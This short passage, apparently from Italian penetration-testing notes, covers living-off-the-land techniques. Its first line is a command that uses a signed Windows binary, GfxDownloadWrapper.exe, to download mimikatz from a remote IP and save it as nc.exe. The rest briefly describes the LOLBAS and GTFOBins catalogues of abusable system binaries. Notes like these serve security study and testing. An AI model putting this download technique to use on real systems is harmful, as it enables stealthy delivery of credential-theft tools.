- GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"

LOLBAS Project: Catalogo di binari, script e driver nativi Windows usabili per bypass di sicurezza e file transfer.

GTFOBins: Equivalente per ambienti Linux/Unix per sfruttare binari di sistema installati (es. wget, curl, python, gdb, ecc.).